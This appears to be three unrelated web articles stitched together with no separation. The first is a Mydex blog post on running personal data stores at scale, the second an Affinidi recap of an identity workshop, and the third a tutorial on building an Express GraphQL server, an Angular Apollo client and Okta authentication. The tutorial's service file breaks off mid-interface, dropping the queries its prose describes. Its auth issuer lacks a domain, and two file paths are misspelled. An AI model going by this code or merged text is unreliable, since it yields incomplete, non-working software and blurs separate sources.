The UK Government via its Government Digital Service is to provide a One Log-in for Government which includes the concept of a personal data store to enable citizen control over how their data is being shared across Government. Tom Read GDS Chief Executive Officer said that “One Log-in for government is currently the organisation’s most important piece of&nbsp;work.”  Scottish Government has <a href="https://medium.com/mydex/supporting-citizen-participation-in-the-design-of-public-services-d3a56e6aa97">just signed a contract</a> with Mydex CIC to improve recruitment of citizens to participate in projects to co-design public services that ensures privacy via the use of its Inclued platform and personal data stores.The UK NHS and BBC are now experimenting with personal data stores for health and media consumption records  <p>In other words, multiple different parties and people are converging on the same solution — of providing citizens with their own personal data stores — to solve multiple different problems.</p><p>The big question now is how to enable this to happen at scale, safely, securely and efficiently. One key element of this is useful, easy-to-use interfaces, the taps and switches that mean people can use the infrastructure without having to think much about it. We’ve <a href="https://medium.com/mydex/flicking-the-switch-of-personal-data-4c5d0d368a31">written about this&nbsp;here</a>.</p><p>But operational deployment as scale presents its own challenge. It’s one thing to build something in a lab to illustrate an idea’s potential. It’s quite another to make the transition to 24/7/365 operations, working at scale in the real world. Answering the question ‘how’ requires robust answers to many hard questions relating to infrastructure resilience, security, system architecture, governance, trustworthiness, business model and legal compliance. Here’s a checklist of these questions in a little more&nbsp;detail.</p><p>Are its underlying design principles fit for purpose, robust and built to&nbsp;last?</p><p>We talk about this issue <a href="https://medium.com/mydex/designed-for-integrity-13a69bcda0b2">in detail&nbsp;here</a>.</p><p>Is the individual’s data really&nbsp;secure?</p><p>It’s very easy to make promises about data security, but very difficult to keep these promises permanently, especially when a system is operating at scale. Here are some of the safeguards that need to be&nbsp;built.</p>  All data should be encrypted in motion and at&nbsp;rest  Distributed architecture: every PDS is separately and individually encrypted (which means the system is not creating a massive centralised database that becomes a honeypot for&nbsp;hackers)  No knowledge operations. Every individual should hold their own private key to their own data: the PDS operator does not have access to this private key, and cannot look into the personal data stores it provides or make any changes to who can send or collect data from it only the individual can.  Everything the company does relating to the security of information management should be independently assessed and certified. To be legitimate, the PDS provider should be certified under ISO 27001 for information security Management.  <p>The Mydex platform displays all these criteria.</p><p>How does the PDS operator cover its costs and make its&nbsp;money?</p>  Is the PDS’s business model open and transparent? Does it, for example, publish a public price tariff, where what organisations are paying, for what, is open for all to&nbsp;see?  How does this business model affect the PDS provider’s incentives? For example, some PDS providers have generated business models where they take a ‘cut’ every time data is shared. This generates an incentive for the PDS provider to maximise the amount of data that is shared, thereby creating a potential conflict of interest between it and the citizens it is supposed to be&nbsp;serving.  <p>To make their offerings attractive to organisations that want to retain control, other PDS providers have created halfway-house ‘personal data stores’ which remain inside the organisation’s operational boundaries, where the individual signs in using the organisation’s systems, and where the organisation places restrictions on what data the individual can share with who. Such faux personal data stores may generate revenue streams for the technology provider, but they generate a conflict of interest with the citizen that defeats the object of having a personal data store in the first&nbsp;place.</p>  Does the PDS provider’s business model create revenue streams that are stable, e.g. designed to last in perpetuity?  <p>Mydex’s business model is designed to be open, to avoid conflicts of interest and to be stable. The model is very simple. Organisations pay a fee to connect to the platform, to enable safe efficient data sharing with individuals. There is no limit on what data can be delivered or accessed by who and for what purpose that is under the control of the individual at all&nbsp;times.</p><p>Does the PDS provider have governance structures designed to ensure its trustworthiness in perpetuity?</p><p>In a new ‘market’ like this, many would-be PDS providers are start-ups that are hungry for funding. Many of them seek funding from venture capitalists who, by definition, are seeking ‘an exit’ in the form of an IPO or trade&nbsp;sale.</p><p>This brings two dangers. First, it incentivises the PDS provider to create a business model that focuses on financial extraction — making money out of citizens and/or organisations — rather than genuine service provision.</p><p>Second, it means that any promises it makes in terms of commitments to privacy, data protection, business model or anything else may only last until the venture is sold. For a PDS provider to be legitimate, its business model and governance must include legally enforceable guarantees that mean it cannot simply go back on its promises in event of ownership of the organisation changing&nbsp;hands.</p><p>That is why Mydex has chosen to be a Community Interest Company — because CIC status builds in legal requirements on the company to stay true to its mission of empowering citizens with their own&nbsp;data.</p><p>Is the IT infrastructure robust and capable of operating at&nbsp;scale?</p><p>Many people operating in IT today have a ‘hacker mindset’. They love writing bits of code that do cool things, and every time they come across a new technical challenge they automatically start writing another, separate, bit of code. Hackers are often brilliant at creating cool point solutions. But as these point solutions add up, they generate complexity and chaos. People with the hacker mindset are not good at building robust, integrated, efficient solutions that operate at scale. For that, we need an engineering, infrastructure-building mindset that is always asking ‘how does this piece fit with everything else that has already been built? Will it work stably and reliably, at volume?’ This requires an engineering mindset, not a hacker&nbsp;mindset.</p><p>Can the system scale without generating mounting risks, costs or complexity?</p>  Providing a million personal data stores that are being used to store and share data, day in and day out, is very different to building a demo in a lab. Having robust software development, testing and deployment systems is essential if the flaws of the hacker mindset are to be&nbsp;avoided.  If the system can only work on a particular device such as a smartphone, everyone has to have access to such a device, these devices need to be designed so that they can ‘talk’ to each other, and problems arise if the device is lost, stolen or malfunctions. The only way millions of people can access their data from multiple different devices is if their data is stored (safely) in the&nbsp;cloud.  Some ways forward, such as Open Banking, envisage individuals giving permission for their data to be ported from one service provider to another without it being deposited in the individual’s personal data store. This, proponents claim, cuts out the unnecessary extra step of having a data ‘middleman’. The approach works fine for just one or two transactions. But it creates complexity and cost catastrophes as volumes rise. It’s why (for example) telephone exchanges were invented rather than every telephone line trying to create its own unique connection with every other&nbsp;line.  <p>Independent scrutiny and certification</p><p>It’s very easy for start-ups to make grand claims about what their technology can do or what their beliefs are. Selling ‘brochureware’ and ‘vaporware’ is a time honoured practice in software: Step 1) sell what you intend to make. Step 2) Use the money made from these sales to actually make what you promised. But an operation that works day in, day out, at scale cannot be fed by ‘vision’ and the apparent confidence of the salesman. What’s needed is independent scrutiny and certification.</p><p>That’s why Mydex is independently certified for data management security under ISO27001 and with Fair Data and why it has met the requirements to be listed on UK Government procurement frameworks like G-Cloud and to gain an Open Banking&nbsp;licence.</p><p>Built-in regulatory compliance</p><p>For any system to scale efficiently it has to make it easier, not harder, for service providers to comply with data protection regulations. This requires dedicated tools and infrastructure that a) ‘designs in’ compliance with key principles such as data minimisation under GDPR and b) enables both citizens and service providers to manage related processes simply, quickly and where possible, automatically.</p><p>Leaving compliance to data protection regulations aside to a ‘different department’ — creates a gap and disconnect between ‘legal’ and operations and is not something that can work efficiently and effectively at&nbsp;scale.</p> Summary <p>We know, because we’ve been there. Bringing new ideas to life in a lab environment is a positive, necessary thing to do. But making sure they can be implemented at scale, robustly, reliably and resiliently involves another — very different — set of considerations. This blog sums up our experience of what these considerations are.</p> <p><a href="https://medium.com/mydex/deploying-personal-data-stores-at-scale-ad35fb205e73">DEPLOYING PERSONAL DATA STORES AT SCALE</a> was originally published in <a href="https://medium.com/mydex">Mydex</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>

<p>The Internet Identity Workshop (IIW) is a biannual gathering of identity enthusiasts where ideas and problems related to Internet <a href="https://academy.affinidi.com/what-links-identity-and-vcs-together-across-applications-9523af3884a9">identity</a> are exchanged and discussed.</p><p>The 32nd edition of IIW took place from October 12th -14th 2021, and it was a mix of online and offline audiences.</p><p>Affinidi had a presence at IIW as it was a unique opportunity to showcase Affinidi’s work in the <a href="https://academy.affinidi.com/self-sovereign-identity-what-you-can-cant-do-with-ssi-1284f7227b4e">Self-Sovereign Identity (SSI)</a> space and to understand the <a href="https://academy.affinidi.com/innovation-in-digital-identity-and-credentials-in-the-post-covid-world-f182a5743ce8">latest trends</a> in this&nbsp;sphere.</p><p>Here are some things we did at&nbsp;IIW.</p> Demo of Schema&nbsp;Manager <p><a href="https://www.affinidi.com/">Affinidi</a> has built a Schema Manager to manage, create, clone, update, and reuse <a href="https://academy.affinidi.com/what-are-verifiable-credentials-79f1846a7b9">verifiable credential</a> types and existing schemas, and this was showcased at&nbsp;IIW.</p><p>This tool is sure to come in handy for developers, product managers, and engineers who are looking to build an SSI application and face the problem of ensuring <a href="https://academy.affinidi.com/what-is-the-trust-triangle-9a9caf36b321">trust</a> between actors (mainly, Issuers and Verifiers).</p><p>Essentially, the Schema Manager allows you to create any custom VC to meet the needs of a given situation or application. You also get to choose the attributes for each VC, and once you’re done, the tool generates a JSON schema that you can include as part of your&nbsp;code.</p><p>The schema you create can be public or private, depending on your preference. Also, you have the choice to publish it as a searchable schema so others can reuse&nbsp;them.</p><p>You can try our <a href="https://ui.schema.affinidi.com/">Schema Manager&nbsp;here</a>.</p> Group Discussion: What does NOT get adoption for SSI? AKA Failures in&nbsp;SSI <p><a href="https://www.linkedin.com/in/launganik/">Kamal Laungani</a>, the Global Developer Ecosystem (GDE)Manager at <a href="https://academy.affinidi.com/">Affinidi</a>, was the convenor of a group discussion on the failures of <a href="https://academy.affinidi.com/is-ssi-the-disruptor-for-a-better-world-aec34cef6275">SSI</a> and the reasons for its non-adoption</p><p>This group of eminent participants talked about how hard it is to adopt <a href="https://academy.affinidi.com/faqs-on-verifiable-credentials-and-self-sovereign-identity-3c3a505878bc">SSI</a> and the reasons for the same were deliberated.</p><p>Some of the barriers discussed were:</p> Onboarding for&nbsp;humans <p>There is a lack of understanding on why privacy is important and what can be done to preserve one’s&nbsp;privacy.</p><p>Also, there is not a whole lot of simple content that explains what Self-Sovereign Identity (SSI is and how it can be a potential game-changer for the security and privacy of online identities.</p> Onboarding for IT and DevOps and&nbsp;IAM <p>There is a gap between community knowledge and information available for IT, DevOps, and IAM professionals. Further, the lack of a well-defined ecosystem and a limited or no incentives model is making adoption more difficult.</p> Short term barriers vs clarity of immediate benefits <p>Since SSI is an emerging field, there are many short-term barriers such as developmental cost, a well-developed and easy-to-understand tech stack, and web 3.0 skill sets. Also, there is little clarity on the immediate benefits because the ecosystem is not in place and there seems to be a lot of uncertainties around government legislation.</p> Legacy integration <p>The big jump from <a href="https://academy.affinidi.com/web-2-0-vs-web-3-0-a-bridge-between-the-past-and-the-future-c99668c1e2f0">Web 2.0 to Web 3.0</a> raises questions on integration with existing systems and apprehensions about building a complete infrastructure from&nbsp;scratch.</p> Who goes&nbsp;first? <p>Right now, this is a classic chicken and egg problem. Companies have few incentives to build applications and are waiting for greater adoption. In turn, users are apprehensive as well because there aren’t enough applications in this&nbsp;space.</p><p>So, this question of who goes first is impeding the growth of SSI&nbsp;greatly.</p> High Project&nbsp;Costs <p>The overall uncertainty coupled with high developmental costs are a barrier for SSI adoptions because the project costs/risks are high, so wrangling internal buy-in is not&nbsp;easy.</p><p>All these reasons were believed to contribute to the low rate of SSI adoption, and this has led every attendee to ponder over what can be done to address these concerns.</p><p>Based on these discussions, we, at Affinidi, have also started pondering over questions on the high costs, how to make it easy for people to know the importance of preserving their privacy through SSI, and what we can do as an organization to drive its adoption.</p> Attending Other&nbsp;Programs <p>Besides the Schema Manager demo and the group discussion, we attended many discussions, workshops, demos, and events, all of which have greatly enriched our knowledge and understanding. We hope to convert these insights into actionable items shortly, so make sure you stay abreast of all that’s happening at Affinidi by being a part of our <a href="https://share.hsforms.com/1FhRGo3c4T-erYRGOSRyzCQ8oa2v">mailing list</a> and following us on <a href="https://www.linkedin.com/company/affinidi/">LinkedIn</a>, <a href="https://twitter.com/affinidi">Twitter</a>, and <a href="https://www.facebook.com/affinidi.devs">Facebook</a>.</p><p>If you have any specific questions or feedback, reach out to us on&nbsp;<a href="https://discord.com/invite/ffV5ctBMXr">Discord</a>.</p><p>The information materials contained in this article are for general information and educational purposes only.

  <p>Over the past five years, GraphQL has established itself as the most popular alternative to REST APIs. GraphQL has several advantages over traditional REST-based services. First of all, GraphQL makes the query schema available to the clients. A client that reads the schema immediately knows what services are available on the server. On top of that, the client is able to perform a query on a subset of the data.</p>

<p>Both of these features make the API much more flexible. The server can freely extend the API or make different parts of it available to different clients without breaking any client code. Another major advantage is the ability to perform complex queries. This reduces the number of API calls a client has to perform, and therefore improves performance.</p>

<p>In this tutorial, I will show you how to consume GraphQL in an Angular client. First, I will create a simple GraphQL server using Express. Then I will use the Apollo library to create a service in Angular that connects to the API and performs queries on it. I will implement a simple application that lets you browse the characters of the Star Wars franchise and look up details about their races and home planets. I will not assume any prior knowledge of Express, Angular, or GraphQL. I will assume that you are familiar with JavaScript and Node and have an up-to-date version of the <code>npm</code> package manager installed on your computer.</p>

 Implement a GraphQL server with Express 

<p>In this section, I will show you how to implement the GraphQL server using the Express framework. To start, open your terminal in an empty folder of your choice. This will be the folder that will contain the server project. Inside that folder, run the following command to initialize your Express project.</p>

   <code>npm init -y
</code>   

<p>This will create a <code>package.json</code> in your folder containing the project information and dependencies. Next, you need to install the dependencies required for this project. In your terminal, run the following command.</p>

   <code>npm i -E express@4.17.1 graphql@15.6.1 express-graphql@0.12.0 cors@2.8.5 \
  body-parser@1.19.0 csv-parse@4.16.3
</code>   

<p>To make the server work, you will need some data. I have chosen to keep it simple and use existing CSV data from Kaggle, a machine learning and data science community. Joe Young has put together Star Wars character data from the Fandom Wiki and made it freely available at this link <a href="https://www.kaggle.com/jsphyg/star-wars">https://www.kaggle.com/jsphyg/star-wars</a>. You will need only two files from his collection for this project <code>characters.csv</code> and <code>species.csv</code>. You might have to create a Kaggle account to download the data. Place the files into your project folder.</p>

<p>GraphQL uses a global schema to define the queries allowed on the API and the data they return. Create a file <code>schema.graphql</code> and paste the following contents into it.</p>

   <code>type Query {
  characters(offset: Int = 0, limit: Int = 10): CharactersResult
  character(name: String!): Character
  species(name: String!): Species
}

type CharactersResult {
  count: Int
  characters: [Character]
}

type Character {
  name: String
  height: Int
  mass: String
  hair_color: String
  skin_color: String
  eye_color: String
  birth_year: String
  gender: String
  homeworld: String
  species: String
}

type Species {
  name: String
  classification: String
  designation: String
  average_height: String
  skin_colors: String
  hair_colors: String
  eye_colors: String
  average_lifespan: String
  language: String
  homeworld: String
}
</code>   

<p>The <code>Query</code> type defines the entry point of the schema. It defines three queries: <code>characters</code>, <code>character</code>, and <code>species</code>. The data returned by these queries is defined in separate types in the schema file. Now, create a new file <code>app.js</code>, and fill it with the code below.</p>

   <code>const express = require('express');
const cors = require('cors');
const { json } = require('body-parser');
const fs = require('fs');
const { graphqlHTTP } = require('express-graphql');
const { buildSchema } = require('graphql');
const parse = require('csv-parse/lib/sync');

const app = express()
  .use(cors())
  .use(json());

const schema = buildSchema(fs.readFileSync('schema.graphql', 'utf8'));
const characters = parse(fs.readFileSync('characters.csv', 'utf8'), { columns: true });
const species = parse(fs.readFileSync('species.csv', 'utf8'), { columns: true });

const root = {
  characters: (args) =&gt; {
    return {
      count: characters.length,
      characters: characters.slice(args.offset, args.offset + args.limit)
    };
  },
  character: (args) =&gt; {
    return characters.find((ch) =&gt; ch.name === args.name);
  },
  species: (args) =&gt; {
    return species.find((ch) =&gt; ch.name === args.name);
  },
};

app.use('/graphql', graphqlHTTP({
  schema,
  rootValue: root,
  graphiql: true,
}));

app.listen(4201, (err) =&gt; {
  if (err) {
    return console.log(err);
  }
  return console.log('Server listening on port 4201');
});
</code>   

<p>This is all the code you need to write to create the GraphQL server. The <code>graphqlHTTP</code> middleware registers the handlers on the <code>/graphql</code> route of the express server. The <code>root</code> object defines so-called reducers that will be called whenever a client queries the API. They are responsible for collecting and returning the data.</p>

<p>The nice thing about GraphQL is that you can immediately try it out. In your terminal, run the following command.</p>

   <code>node app.js
</code>   

<p>Now open your browser at <code>http://localhost:4201/graphql</code> and you will be presented with an interactive console.</p>

<p></p>

<p>On the left side, you can try out queries. Give it a go by pasting the following query into the query editor in the browser and pressing the play button at the top.</p>

   <code>{
  characters(offset: 2, limit:3) {
    count
    characters {
      name
      homeworld
      species
    }
  }
  species(name:"Human") {
    classification
    homeworld
  }
}
</code>   

<p>You should see this result on the right side of the screen.</p>

   <code>{
  "data": {
    "characters": {
      "count": 87,
      "characters": [
        {
          "name": "R2-D2",
          "homeworld": "Naboo",
          "species": "Droid"
        },
        {
          "name": "Darth Vader",
          "homeworld": "Tatooine",
          "species": "Human"
        },
        {
          "name": "Leia Organa",
          "homeworld": "Alderaan",
          "species": "Human"
        }
      ]
    },
    "species": {
      "classification": "mammal",
      "homeworld": "Coruscant"
    }
  }
}
</code>   

 Create an Angular GraphQL client 

<p>Angular provides a command-line tool that makes it easy for anybody to set up and maintain an Angular project. The Angular CLI tool can be installed globally using <code>npm</code> by running the following command.</p>

   <code>npm install -g @angular/cli@12.2.10
</code>   

<p>This package provides the global <code>ng</code> command. With this, open the terminal in a folder of your choice and create a new project by running the command below.</p>

   <code>ng new graphql-client --routing --style=css
</code>   

<p>This will create a folder <code>graphql-client</code>, install the Angular framework into it, set up all the necessary toolchains, and create a default application skeleton that you can extend.</p>

<p>The Apollo library offers a convenient GraphQL client. Navigate into the new project folder and add it to the project by running the following command.</p>

   <code>ng add apollo-angular
</code>   

<p>When asked to confirm the installation of the library, answer with <code>y</code>. Next, you will be asked to provide the endpoint URI. Type in <code>http://localhost:4201/graphql</code> and press enter. Now that the basic setup is done, you are ready to create a few components.</p>

<p>Start by creating three components: a <code>Navbar</code> for the page navigation, <code>Home</code> for the home page, and <code>Browse</code>, containing a page to let you browse through the query results. In the terminal, run the following commands.</p>

   <code>ng generate component navbar --module=app
ng generate component home --module=app
ng generate component browse --module=app
</code>   

<p>In an editor of your choice, open <code>src/app/app.component.html</code> and replace its content with the following two lines.</p>

   <code>&lt;app-navbar&gt;&lt;/app-navbar&gt;
&lt;router-outlet&gt;&lt;/router-outlet&gt;
</code>   

<p>There are only two components here. The first will show the navigation bar. The <code>&lt;router-outlet&gt;</code> is a special component in Angular. The Angular router is responsible for reading the navigation URL and deciding which component to show based on the requested path. The <code>&lt;router-outlet&gt;</code> will then show that component.</p>

<p>Next, open <code>src/app/navbar/navbar.component.html</code> and paste the code below into the file.</p>

   <code>&lt;div class="navbar"&gt;
  &lt;div&gt;
    GraphQL Angular App
  &lt;/div&gt;
  &lt;nav&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a routerLink="/"&gt;Home&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a routerLink="/browse"&gt;Browse&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/nav&gt;
&lt;/div&gt;
</code>   

<p>Notice the <code>routerLink</code> properties on the anchor tags. These links are similar to relative links inside regular HTML. But instead of reloading the page, they instruct the router to replace the active component in the <code>router-outlet</code>.</p>

<p>The navigation bar could use some styling. Open <code>src/app/navbar/navbar.component.css</code> and fill in the CSS code below.</p>

   <code>.navbar {
  padding: 8px 16px;
  background-color: #333333;
  color: #ffffff;
  display: flex;
  justify-content: space-between;
  align-items: center;
}

nav ul {
  display: flex;
  list-style: none;
  padding: 0;
}

nav li {
  margin-left: 8px;
  margin-right: 8px;
}

a {
  color: #ffffff;
  text-decoration: none;
}
</code>   

<p>Now, update the <code>Home</code> component by pasting the following line into <code>src/app/home/hone.component.html</code>.</p>

   <code>&lt;h1&gt;Consuming GraphQL with Angular&lt;/h1&gt;
</code>   

<p>To style the component, open <code>src/app/home/hone.component.css</code> and add the following code.</p>

   <code>h1 {
  text-align: center;
  margin: 4rem;
}
</code>   

<p>Before you can start work on the <code>Browse</code> component, you need a service class that encapsulates the calls to the GraphQL API. This class is the core part of this application and demonstrates just how easy it is to communicate with the server using GraphQL. Open the terminal in your project folder and run the following command.</p>

   <code>ng generate service characters
</code>   

<p>This will create a new file <code>src/app/characters.service.ts</code>. Open this file in your editor and replace its contents with the code below.</p>

   <code>import { Injectable } from '@angular/core';
import { Apollo, gql, QueryRef } from 'apollo-angular';

export interface Character {
  name: string;
  homeworld: string;
  species: string;
}

export interface CharacterDetail extends Character {
  height: number;
  mass: string;
  hair_color: string;

<p>This implementation of the service consists of three parts. At the top of the file, I declared the TypeScript types related to this service. Each type represents the result of a query. The second part is the constructor. Here, the Apollo queries are defined. The queries make use of the <code>gql</code> tag to template strings. This tag translates the strings to GraphQL documents. Finally, the member functions of the service make the queries publicly available to components in your application.</p>

<p>The queries are asynchronous and return promises that resolve the query result once a response from the server has been received.</p>

<p>With this, you can now implement the <code>Browse</code> component. Open <code>src/app/browse/browse.component.ts</code> and change its content to match the following code.</p>

   <code>import { Component, OnInit } from '@angular/core';
import { Character, CharactersService } from '../characters.service';

@Component({
  selector: 'app-browse',
  templateUrl: './browse.component.html',
  styleUrls: ['./browse.component.css']
})
export class BrowseComponent implements OnInit {
  offset: number = 0;
  count: number = 0;
  characters: Character[] = [];

  constructor(private charactersService: CharactersService) {}

  async ngOnInit(): Promise&lt;void&gt; {
    await this.updateCharacters();
  }

  async updateCharacters() {
    const result = await this.charactersService.getCharacters(this.offset);
    this.count = result.count;
    this.characters = result.characters;
  }

  showPrevious() {
    return this.offset &gt; 0;
  }

  showNext() {
    return this.offset + 10 &lt; this.count;
  }

  async onPrevious() {
    this.offset -= 10;
    await this.updateCharacters();
  }

  async onNext() {
    this.offset += 10;
    await this.updateCharacters();
  }
}
</code>   

<p>The function <code>updateCharacters()</code> uses the <code>CharactersService</code> to obtain a list of characters from the server. The functions <code>onPrevious()</code> and <code>onNext()</code> are callbacks that can be used to page through the results. Now, open <code>src/app/browse/browse.component.html</code> and copy the following contents into it.</p>

   <code>&lt;div class="browse"&gt;
  &lt;h1&gt;Browse Characters&lt;/h1&gt;
  &lt;table&gt;
    &lt;tr&gt;
      &lt;th&gt;Name&lt;/th&gt;
      &lt;th&gt;Homeworld&lt;/th&gt;
      &lt;th&gt;Species&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr *ngFor="let character of characters"&gt;
      &lt;td&gt;&lt;a [routerLink]="['/character']" [queryParams]="{name: character.name}"&gt;{{character.name}}&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;{{character.homeworld}}&lt;/td&gt;
      &lt;td&gt;&lt;a [routerLink]="['/species']" [queryParams]="{name: character.species}"&gt;{{character.species}}&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/table&gt;
  &lt;div class="pager"&gt;
    &lt;button class="prev" *ngIf="showPrevious()" (click)="onPrevious()"&gt; prev &lt;/button&gt;
    &lt;button class="next" *ngIf="showNext()" (click)="onNext()"&gt; next &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
</code>   

<p>The component displays the character data in a table and provides navigation buttons to page through the results. It also provides links to routes that will display details of a character or its species. You will be implementing those routes later.</p>

<p>The CSS file <code>src/app/browse/browse.component.css</code> can be used to provide some styling to the browse component. Update the contents to the code below.</p>

   <code>.browse {
  width: 100%;
  display: flex;
  flex-direction: column;
  align-items: center;
}

.browse &gt; * {
  width: 100%;
  max-width: 800px;
}

table {
  margin-top: 16px;
  margin-bottom: 16px;
  border-collapse: collapse;
  border: 1px solid #bbbbbb;
}

tr:nth-child(odd) {
  background-color: #dddddd;
}

th, td {
  padding: 4px 8px;
  border-right: 1px solid #bbbbbb;
  border-left: 1px solid #bbbbbb;
}

.prev {
  float: left;
}

.next {
  float: right;
}
</code>   

<p>Now, create the two components that will display the character and species details. Open the terminal again and type in the following commands.</p>

   <code>ng generate component character --module=app
ng generate component species --module=app
</code>   

<p>This will create the files for the two components. Open <code>src/app/character/character.component.ts</code> and paste the following code into it.</p>

   <code>import { Component, OnInit } from '@angular/core';
import { ActivatedRoute } from '@angular/router';
import { CharacterDetail, CharactersService } from '../characters.service';

@Component({
  selector: 'app-character',
  templateUrl: './character.component.html',
  styleUrls: ['./character.component.css']
})
export class CharacterComponent implements OnInit {
  character!: CharacterDetail;

  constructor(private route: ActivatedRoute, private characterService: CharactersService) { }

  ngOnInit(): void {
    this.route.queryParams.subscribe(async (params) =&gt; {
      this.character = await this.characterService.findCharacter(params.name);
    });
  }
}
</code>   

<p>This is a simple component that reads the character’s name from the query parameters in the URL and then uses <code>CharactersService</code> to obtain the character detail. The corresponding template simply shows the queried data. Open <code>src/app/character/character.component.html</code> and copy the following contents into it.</p>

   <code>&lt;div *ngIf=character&gt;
  &lt;p&gt;&lt;strong&gt;Name:&lt;/strong&gt; {{character.name}}&lt;/p&gt;
  &lt;p&gt;&lt;strong&gt;Mass:&lt;/strong&gt; {{character.mass}}&lt;/p&gt;
  &lt;p&gt;&lt;strong&gt;Hair Color:&lt;/strong&gt; {{character.hair_color}}&lt;/p&gt;
  &lt;p&gt;&lt;strong&gt;Skin Color:&lt;/strong&gt; {{character.skin_color}}&lt;/p&gt;
  &lt;p&gt;&lt;strong&gt;Eye Color:&lt;/strong&gt; {{character.eye_color}}&lt;/p&gt;
  &lt;p&gt;&lt;strong&gt;Birth Year:&lt;/strong&gt; {{character.birth_year}}&lt;/p&gt;
  &lt;p&gt;&lt;strong&gt;Gender:&lt;/strong&gt; {{character.gender}}&lt;/p&gt;
&lt;/div&gt;
&lt;a [routerLink]="['/browse']"&gt;Back&lt;/a&gt;
</code>   

<p>The component showing the species information follows the same pattern. Open <code>src/app/species/species.component.ts</code> and update the content to match the code below.</p>

   <code>import { Component, OnInit } from '@angular/core';
import { ActivatedRoute } from '@angular/router';
import { CharactersService, Species } from '../characters.service';

@Component({
  selector: 'app-species',
  templateUrl: './species.component.html',
  styleUrls: ['./species.component.css']
})
export class SpeciesComponent implements OnInit {
  species!: Species;

  constructor(private route: ActivatedRoute, private characterService: CharactersService) { }

  ngOnInit(): void {
    this.route.queryParams.subscribe(async (params) =&gt; {
      this.species = await this.characterService.findSpecies(params.name);
    });
  }
}
</code>   

<p>Next, open <code>src/app/species/species.component.html</code> and paste in the code below.</p>

   <code>&lt;div *ngIf=species&gt;
  &lt;p&gt;&lt;strong&gt;Name:&lt;/strong&gt; {{species.name}}&lt;/p&gt;
  &lt;p&gt;&lt;strong&gt;Classification:&lt;/strong&gt; {{species.classification}}&lt;/p&gt;
  &lt;p&gt;&lt;strong&gt;Designation:&lt;/strong&gt; {{species.designation}}&lt;/p&gt;
  &lt;p&gt;&lt;strong&gt;Hair Colors:&lt;/strong&gt; {{species.hair_colors}}&lt;/p&gt;
  &lt;p&gt;&lt;strong&gt;Skin Colors:&lt;/strong&gt; {{species.skin_colors}}&lt;/p&gt;
  &lt;p&gt;&lt;strong&gt;Eye Colors:&lt;/strong&gt; {{species.eye_colors}}&lt;/p&gt;
  &lt;p&gt;&lt;strong&gt;Average Lifespan:&lt;/strong&gt; {{species.average_lifespan}}&lt;/p&gt;
  &lt;p&gt;&lt;strong&gt;Language:&lt;/strong&gt; {{species.language}}&lt;/p&gt;
  &lt;p&gt;&lt;strong&gt;Homeworld:&lt;/strong&gt; {{species.homeworld}}&lt;/p&gt;
&lt;/div&gt;
&lt;a [routerLink]="['/browse']"&gt;Back&lt;/a&gt;
</code>   

<p>I already mentioned how the Angular router is responsible for deciding which component to render, based on the path in the URL. In the file <code>src/app/app-routing.module.ts</code> you can define these associations.</p>

   <code>import { NgModule } from '@angular/core';
import { RouterModule, Routes } from '@angular/router';
import { HomeComponent } from './home/home.component';
import { BrowseComponent } from './browse/browse.component';
import { CharacterComponent } from './character/character.component';
import { SpeciesComponent } from './species/species.component';

const routes: Routes = [
  {
    path: '',
    component: HomeComponent
  },
  {
    path: 'browse',
    component: BrowseComponent,
  },
  {
    path: 'character',
    component: CharacterComponent,
  },
  {
    path: 'species',
    component: SpeciesComponent,
  },
];

@NgModule({
  imports: [RouterModule.forRoot(routes)],
  exports: [RouterModule]
})
export class AppRoutingModule { }
</code>   

<p>You are now ready to test the application. Make sure your server is running as described in the previous section. Then open a terminal in the client Angular project folder and run the following command.</p>

   <code>ng serve
</code>   

<p>Open your browser, navigate to <code>http://localhost:4200</code> and you should see the homepage of your app. You can use the navigation bar to go to the browse page. You should see something like the image below.</p>

<p></p>

 Integrate OIDC for auth 

<p>Every good application needs some user control. Okta lets you add user authentication easily to your application.</p>

<p>Before you begin, you’ll need a free Okta developer account. Install the <a href="https://cli.okta.com">Okta CLI</a> and run <code>okta register</code> to sign up for a new account. If you already have an account, run <code>okta login</code>.
Then, run <code>okta apps create</code>. Select the default app name, or change it as you see fit.
Choose Single-Page App and press Enter.</p>

<p>Use <code>http://localhost:4200/login/callback</code> for the Redirect URI and set the Logout Redirect URI to <code>http://localhost:4200</code>.</p>


  What does the Okta CLI do?
<p>The Okta CLI will create an OIDC Single-Page App in your Okta Org. It will add the redirect URIs you specified and grant access to the Everyone group. It will also add a trusted origin for <code>http://localhost:4200</code>. You will see output like the following when it’s finished:</p>
   <code>Okta application configuration:
Issuer:    https://dev-133337.okta.com/oauth2/default
Client ID: 0oab8eb55Kb9jdMIr5d6
</code>   
<p>NOTE: You can also use the Okta Admin Console to create your app. See <a href="https://developer.okta.com/docs/guides/sign-into-spa/angular/create-okta-application/">Create an Angular App</a> for more information.</p>



<p>Make a note of the <code>Issuer</code> and the <code>Client ID</code>. You will need them in the next steps.</p>

 Add JWT authentication to the server 

<p>Adding authentication to the server is easy. Open a terminal in the server’s project folder and install a few more dependencies by running the following command.</p>

   <code>npm i -E @okta/jwt-verifier@2.3.0 express-bearer-token@2.4.0
</code>   

<p>Now, create a new file <code>auth.js</code> with the content below.</p>

   <code>const OktaJwtVerifier = require('@okta/jwt-verifier');

const oktaJwtVerifier = new OktaJwtVerifier({
  clientId: '{yourClientID}',
  issuer: '/oauth2/default'
});

module.exports = async function oktaAuth(req, res, next) {
  try {
    const token = req.token;
    if (!token) {
      return res.status(401).send('Not Authorized');
    }
    await oktaJwtVerifier.verifyAccessToken(token, 'api://default');
    next();
  }
  catch (err) {
    return res.status(401).send(err.message);
  }
};
</code>   

<p>This module exports an Express middleware that checks the bearer token of an incoming request and verifies its validity. To use this middleware, open <code>app.js</code> and add the following <code>require</code> statements to the top of the file.</p>

   <code>const bearerToken = require('express-bearer-token');
const oktaAuth = require('./auth');
</code>   

<p>Then, update the creation of the Express server with the declaration of the middleware to match the following.</p>

   <code>const app = express()
  .use(cors())
  .use(json())
  .use(bearerToken())
  .use(oktaAuth);
</code>   

